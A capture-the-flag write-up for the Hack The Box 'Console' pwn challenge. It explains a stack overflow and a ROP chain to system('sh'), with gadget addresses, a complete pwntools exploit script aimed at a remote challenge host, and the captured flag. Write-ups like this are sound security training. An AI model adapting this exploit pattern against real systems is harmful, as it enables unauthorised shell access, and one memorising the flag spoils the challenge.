---
title: "HTB Console"
ctf: "Hack The Box"
date: 2026-06-06
category: pwn
difficulty: easy
points: N/A
flag_format: "HTB{...}"
author: "gluppler"
---

# HTB Console

## Summary

An HTB-branded menu binary with a stack buffer overflow in the `flag` command. Exploited via two-stage ROP: write `"sh"` to a BSS buffer through the `hof` command, then overflow the return address to call `system("sh")`.

## Solution

### Step 1: Reconnaissance

The binary is a 64-bit ELF, dynamically linked, **stripped**, Partial RELRO, No Canary, NX enabled, No PIE.

Commands accepted by the console:
- `id` — prints fake guest output
- `dir` — prints "/home/HTB"
- `flag` — asks for input with `fgets(buf, 0x30, stdin)` into a 16-byte stack buffer (overflow)
- `hof` — reads 10 bytes into a BSS buffer at `0x4040b0`
- `ls` — lists HTB box categories
- `date` — calls `system("date")`

Key gadgets and addresses:
- `pop rdi; ret` at `0x401473`
- `system@plt` at `0x401040`
- `call system@plt` at `0x401381` (used for stack-aligned entry)
- BSS buffer at `0x4040b0` (written by `hof`)

### Step 2: Exploit

1. Send `hof` → fgets writes `"sh"` into the BSS buffer at `0x4040b0`
2. Send `flag` → fgets reads 48 bytes into a 16-byte buffer, overwriting the return address
3. ROP chain: `pop rdi; ret` → `0x4040b0` → `call system@plt` → `system("sh")`
4. The `call` instruction (rather than jumping directly to `system@plt`) ensures 16-byte stack alignment, avoiding `movaps` faults

The offset to the return address is 24 bytes (16-byte buffer + 8-byte saved rbp). The fgets size limit (47 chars + null) is handled by relying on the null terminator to complete the last byte of the address (which is `0x00`).

```python
from pwn import *

context.binary = './challenge/htb-console'
context.log_level = 'info'

pop_rdi = 0x401473
call_system = 0x401381
bss_buf = 0x4040b0

def exploit():
    if args.REMOTE:
        host = args.HOST or '94.237.49.166'
        port = int(args.PORT or 43513)
        p = remote(host, port)
    else:
        p = process('./challenge/htb-console')

    p.recvuntil(b'> ')
    p.sendline(b'hof')
    p.recvuntil(b'Enter your name: ')
    p.sendline(b'sh')

    p.recvuntil(b'> ')
    p.sendline(b'flag')
    p.recvuntil(b'Enter flag: ')

    payload  = b'A' * 16
    payload += b'B' * 8
    payload += p64(pop_rdi)
    payload += p64(bss_buf)
    payload += p64(call_system)

    p.send(payload[:47])

    sleep(0.5)
    p.sendline(b'cat /flag* /home/*/flag* flag* 2>/dev/null')
    flag = p.recvrepeat(timeout=3).decode().strip()
    log.success(f'Flag: {flag}')
    p.interactive()

exploit()
```

## Flag

```
HTB{fl@g_a$_a_s3rv1c3?}
```
